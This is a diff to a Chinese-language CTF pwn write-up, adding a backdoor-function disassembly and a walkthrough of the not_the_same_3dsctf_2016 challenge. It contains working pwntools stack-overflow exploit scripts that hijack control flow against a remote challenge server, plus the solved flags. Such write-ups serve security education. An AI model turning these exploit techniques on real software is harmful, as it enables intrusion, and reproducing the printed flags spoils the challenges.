@@ -2459,7 +2459,22 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-程序首先输入`size_t`型的`nbytes`，如果这个无符号整数强制转换成`int`型后大于`10`就终止程序，否则`nbytes`为下一次输入的最大长度限制。`read`函数向`buf`变量中写入不超过`nbytes`字节的数据。
+程序首先输入`size_t`型的`nbytes`，如果这个无符号整数强制转换成`int`型后大于`10`就终止程序，否则`nbytes`为下一次输入的最大长度限制。`read`函数向`buf`变量中写入不超过`nbytes`字节的数据，存在栈溢出漏洞。在`Functions window`中看到后门函数`backdoor`。
+
+```assembly
+public backdoor
+backdoor proc near
+; __unwind {
+push    rbp
+mov     rbp, rsp
+mov     edi, offset command ; "/bin/sh"
+call    _system
+mov     eax, 1
+pop     rbp
+retn
+; } // starts at 400726
+backdoor endp
+```
 
 当第一次输入`-1`时就能造成栈溢出漏洞，编写`Python`代码求解得到`flag{8cdd2ef8-b593-4974-8dcf-a8eb632145e6}`。
 
@@ -2611,6 +2626,73 @@ log.info('bin_sh_address => %s', hex(bin_sh_addr))
 io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
 payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
 io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
+### not_the_same_3dsctf_2016
+
+先`file ./not_the_same_3dsctf_2016`查看文件类型，再`checksec --file=./not_the_same_3dsctf_2016`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./not_the_same_3dsctf_2016
+./not_the_same_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./not_the_same_3dsctf_2016
+[*] '/home/tyd/ctf/pwn/buuctf/not_the_same_3dsctf_2016'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`./not_the_same_3dsctf_2016`，按`F5`反汇编源码并查看主函数。发现`gets()`函数读取输入到变量`v4`中，`v4`的长度有`0x2D`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF
+
+  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
+  gets(v4);
+  return 0;
+}
+```
+
+在`Functions window`中看到后门函数`get_secret`。
+
+```c
+int get_secret()
+{
+  int v0; // esi
+
+  v0 = fopen("flag.txt", &unk_80CF91B);
+  fgets(&fl4g, 45, v0);
+  return fclose(v0);
+}
+```
+
+首先我们可以利用栈溢出漏洞，劫持程序跳转至后门函数`get_secret`，读取`flag.txt`中的内容到`fl4g`，返回到主函数后再次利用栈溢出漏洞和程序内的`write`函数，读取`fl4g`中的内容。编写`Python`代码求解得到`flag{be1e304b-8a02-4cda-b3dd-54fbdca25619}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+elf = ELF('./not_the_same_3dsctf_2016')
+io = remote('node4.buuoj.cn', 26057)
+main = elf.sym['main'] # 0x80489E0
+get_secret = elf.sym['get_secret'] # 0x80489A0
+fl4g = 0x80ECA2D
+write = elf.sym['write'] # 0x806E270
+offset = 0x2d
+payload = b'a'*offset + p32(get_secret) + p32(main)
+io.sendline(payload)
+payload = b'a'*offset + p32(write) + p32(main) + p32(1) + p32(fl4g) + p32(offset)
 io.sendline(payload)
 io.interactive()
 ```
